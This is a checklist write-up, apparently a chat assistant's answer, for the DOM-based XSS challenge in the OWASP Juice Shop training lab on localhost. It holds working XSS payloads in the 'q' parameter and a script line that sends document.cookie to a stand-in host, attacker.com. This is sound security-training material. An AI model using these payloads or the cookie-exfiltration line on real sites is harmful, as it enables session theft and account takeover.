✅ Task Breakdown: DOM-Based XSS via URL Parameter Injection
🔹 [x] Identify Vulnerable URL Parameters
🧠 Goal:
Find a query parameter that is reflected into the DOM without sanitization.

🛠️ Steps:
Open Juice Shop:

bash
Copy
Edit
http://localhost:3000/
Append a dummy query param to the URL:

bash
Copy
Edit
http://localhost:3000/#/search?q=test
Open Developer Tools → Elements tab, search for the term "test".

Check for sinks like:

innerHTML

document.write()

jQuery .html()

✅ Output:
The q parameter content is reflected on the page without encoding.

🔹 [x] Craft Working DOM-Based XSS Payload
🧠 Goal:
Inject a script that executes in the victim's browser when placed in the q parameter.

💣 Payload Options:
bash
Copy
Edit
http://localhost:3000/#/search?q=<script>alert(1)</script>
http://localhost:3000/#/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
http://localhost:3000/#/search?q="><svg/onload=alert(1)>
🔐 Techniques Used:
Encoded entities

Breaking out of HTML attributes

Abuse of event handlers (onload, onerror)

✅ Output:
Payload should get reflected into DOM and trigger a JavaScript alert popup.

🔹 [ ] Test and Verify Payload Execution
🧠 Goal:
Ensure the payload is executed in the DOM without any manual interaction.

✅ Expected Behavior:
Alert box pops up with 1 or document.cookie

Challenge banner appears: "You successfully solved the Bonus Payload challenge."

🧪 Optional Verification:
Use browser DevTools Console:

js
Copy
Edit
console.log(document.location.href);
Or track cookie access with:

js
Copy
Edit
<script>fetch('http://attacker.com/log?' + document.cookie)</script>
(Only for advanced testing in isolated environments)

🔹 [ ] Take Screenshot for Documentation
🧠 Goal:
Capture evidence of successful XSS execution and challenge completion.

📸 Steps:
Keep the alert box visible.

Open the Score Board (http://localhost:3000/#/score-board) to show completion.

Use:

bash
Copy
Edit
Shift + PrtSc (Windows)  
Cmd + Shift + 4 (Mac)
Save with naming convention:

bash
Copy
Edit
DOM-XSS-Payload-Execution.png
🔹 [ ] Push Updates to GitHub
🧠 Goal:
Version-control your exploit documentation and payloads.

📂 Suggested Folder Structure:
mathematica
Copy
Edit
OWASP-Juice-Shop-Bonus-Payload/
└── Method-2-URL-Injection/
    ├── README.md
    ├── payload.txt
    ├── screenshot.png
🛠️ Git Commands:
bash
Copy
Edit
cd ~/juice-shop/OWASP-Juice-Shop-Bonus-Payload/Method-2-URL-Injection

# Stage all changes
git add .

# Commit with clear message
git commit -m "Added DOM-based XSS via URL Injection – tested payload and screenshot"

# Push to GitHub
git push origin main
✅ Expected Output:
Your repository now includes:

Payloads

README with PoC

Screenshot

Documented steps for future reference

